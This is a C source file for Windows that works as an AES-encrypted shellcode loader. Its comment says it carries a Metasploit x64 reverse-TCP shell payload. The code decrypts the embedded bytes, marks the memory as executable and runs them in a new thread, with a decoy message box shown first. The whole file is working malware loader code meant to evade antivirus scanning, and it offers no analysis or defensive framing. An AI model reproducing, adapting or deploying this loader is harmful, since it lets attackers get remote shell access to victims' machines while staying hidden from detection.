﻿#include <Windows.h>
#include <stdio.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")

void DecryptAES(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("Failed in CryptAcquireContextW (%u)\n", GetLastError());
        return;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        printf("Failed in CryptCreateHash (%u)\n", GetLastError());
        return;
    }
    if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) {
        printf("Failed in CryptHashData (%u)\n", GetLastError());
        return;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        printf("Failed in CryptDeriveKey (%u)\n", GetLastError());
        return;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)shellcode, &shellcodeLen)) {
        printf("Failed in CryptDecrypt (%u)\n", GetLastError());
        return;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

}

int main() {

	// use payload/windows/x64/shell_reverse_tcp
	// generate -f c 
	MessageBox(NULL, "Hello OxWan", "@0xWan", MB_OK);
	unsigned char AESkey[] = { 0xd6, 0xe4, 0x98, 0x8d, 0xf, 0xdb, 0x3, 0x3b, 0xd5, 0x2e, 0x26, 0xc4, 0xbe, 0x28, 0xbb, 0xf9 };
	unsigned char payload[] = { 0x78, 0xd9, 0xf, 0x91, 0xd9, 0xed, 0xf4, 0x31, 0x2e, 0xf4, 0x4d, 0x55, 0x2e, 0x55, 0xe0, 0x41, 0x75, 0x24, 0xdd, 0x39, 0xa5, 0xbf, 0xb3, 0x16, 0x23, 0xea, 0x36, 0xfd, 0xfe, 0x48, 0x2d, 0xdc, 0x3e, 0x22, 0xc5, 0x52, 0x64, 0x85, 0x7e, 0x8b, 0xe7, 0xfe, 0x45, 0xa0, 0xf6, 0x39, 0x34, 0x74, 0x40, 0x2f, 0xb3, 0x81, 0xcf, 0x77, 0x6f, 0x7a, 0x4d, 0xb0, 0x71, 0xea, 0x73, 0x62, 0x30, 0x0, 0x38, 0x12, 0x44, 0x22, 0xed, 0xc5, 0x94, 0x67, 0x16, 0xd6, 0xcf, 0x44, 0xbd, 0xce, 0x13, 0x4, 0x6, 0x2f, 0x4d, 0x9e, 0xcd, 0x57, 0x98, 0x48, 0x60, 0x4c, 0xf4, 0x3c, 0x8e, 0x94, 0xe9, 0xd6, 0x8e, 0x48, 0xf9, 0x14, 0x7d, 0x23, 0x7a, 0xe6, 0x66, 0xb, 0xc5, 0x8, 0xf7, 0x22, 0x7c, 0x4b, 0x3a, 0x79, 0xb8, 0xe, 0xfa, 0xea, 0x1, 0x17, 0xeb, 0x9d, 0x59, 0xb3, 0x5f, 0x63, 0xa9, 0x54, 0x2d, 0x18, 0x49, 0xf4, 0xb, 0x2, 0x4, 0x69, 0x97, 0xe7, 0x29, 0x2d, 0xcf, 0x2e, 0xe2, 0x50, 0xbb, 0x1d, 0xc, 0x5a, 0xb7, 0xf0, 0xbf, 0x7, 0x5b, 0xb, 0x9d, 0xdb, 0xc4, 0x51, 0x4f, 0x59, 0x91, 0xf3, 0xd0, 0x50, 0x34, 0xf2, 0xa8, 0x4a, 0xa3, 0x3a, 0xce, 0xe3, 0xca, 0x1e, 0x22, 0x79, 0x0, 0x9d, 0x3e, 0x30, 0x97, 0x5b, 0x8a, 0x6c, 0x81, 0x3d, 0x61, 0x7f, 0xb, 0x9d, 0xf2, 0xc1, 0xbe, 0xad, 0xb8, 0x50, 0x7b, 0x6e, 0xea, 0x8c, 0x65, 0xf0, 0x85, 0x39, 0xd2, 0xc0, 0x51, 0x15, 0x9c, 0x4b, 0xd9, 0x53, 0x54, 0xc5, 0xfa, 0xaa, 0x89, 0xf2, 0xb4, 0x3f, 0x1f, 0xf2, 0x3f, 0x80, 0x9f, 0x45, 0x52, 0x9b, 0x74, 0x4c, 0xc6, 0x1c, 0x1c, 0xa3, 0x56, 0x45, 0x27, 0x93, 0xe4, 0xdb, 0x1d, 0xcc, 0x0, 0xb8, 0xa9, 0x6b, 0xbd, 0xc8, 0x51, 0x6e, 0xdf, 0x7d, 0xa, 0xb6, 0xdd, 0x33, 0x1f, 0xc2, 0x4a, 0xa, 0xb1, 0xbc, 0xb9, 0x39, 0xb3, 0x8a, 0x7f, 0x8f, 0x83, 0x7d, 0x9d, 0xb9, 0x61, 0xc8, 0xd1, 0x14, 0x99, 0xf1, 0x8c, 0xf8, 0xa, 0x22, 0x8b, 0xdd, 0xd, 0x63, 0xb9, 0xe0, 0x24, 0xa7, 0x56, 0x55, 0x27, 0xff, 0x16, 0x8e, 0x20, 0xcb, 0x3e, 0x40, 0xf1, 0x5c, 0x9d, 0xc5, 0xc, 0x82, 0x6d, 0xda, 0xa6, 0x8f, 0xa6, 0x1a, 0x74, 0xf2, 0xa2, 0x52, 0x5f, 0x6a, 0xfd, 0xd8, 0xfa, 0xca, 0x76, 0xca, 0xf5, 0x3a, 0xa9, 0xa, 0x48, 0x35, 0xb9, 0x20, 0xaa, 0xaa, 0x3, 0xe4, 0x3c, 0x53, 0xb1, 0x29, 0xf8, 0xc9, 0xa2, 0x1a, 0x3b, 0x25, 0x72, 0xbb, 0x49, 0xf1, 0x1, 0xa7, 0x12, 0x66, 0xc4, 0x2c, 0x2d, 0x2a, 0xf2, 0x6e, 0xe6, 0x53, 0x8, 0x2d, 0x4f, 0xc1, 0x3a, 0x48, 0x83, 0x74, 0xac, 0x86, 0x72, 0x2f, 0xfb, 0x72, 0x66, 0x44, 0xe1, 0xd0, 0x73, 0x6a, 0x9c, 0xf, 0xfe, 0xa2, 0xba, 0x92, 0xb1, 0xb4, 0x90, 0x4, 0xa4, 0x4f, 0xe6, 0xb1, 0x42, 0x4, 0x94, 0x39, 0x39, 0xd7, 0x4c, 0xc0, 0x76, 0xdf, 0xe7, 0x5, 0xb6, 0x1, 0x8c, 0x96, 0xd3, 0x58, 0x8f, 0x72, 0x6a, 0x45, 0x23, 0x9d, 0xcc, 0xe7, 0xbd, 0x4a, 0x9a, 0x9a, 0x27, 0x97, 0x50, 0x48, 0x8f, 0x61, 0xcf, 0x9c, 0xaf, 0x7c, 0x7d, 0x4d, 0xd7, 0x5, 0x6, 0xe9, 0xff, 0xcd, 0x85, 0xde, 0xd7, 0xcb, 0xfa, 0x7f, 0x72, 0x18, 0x4e, 0x2c, 0x96, 0x90, 0x54, 0x21, 0x17, 0xe0, 0x26, 0x8a, 0x6a, 0x8c };


	DWORD payload_length = sizeof(payload);
	
	LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!alloc_mem) {
		printf("Failed to Allocate memory (%u)\n", GetLastError());
		return -1;
	}
	DecryptAES((char*)payload, payload_length, AESkey, sizeof(AESkey));
	MoveMemory(alloc_mem, payload, sizeof(payload));
	//RtlMoveMemory(alloc_mem, payload, sizeof(payload));


	DWORD oldProtect;

	if (!VirtualProtect(alloc_mem, sizeof(payload), PAGE_EXECUTE_READ, &oldProtect)) {
		printf("Failed to change memory protection (%u)\n", GetLastError());
		return -2;
	}


	HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
	if (!tHandle) {
		printf("Failed to Create the thread (%u)\n", GetLastError());
		return -3;
	}

	printf("\n\nalloc_mem : %p\n", alloc_mem);
	WaitForSingleObject(tHandle, INFINITE);
	getchar();
	((void(*)())alloc_mem)();

	return 0;
}
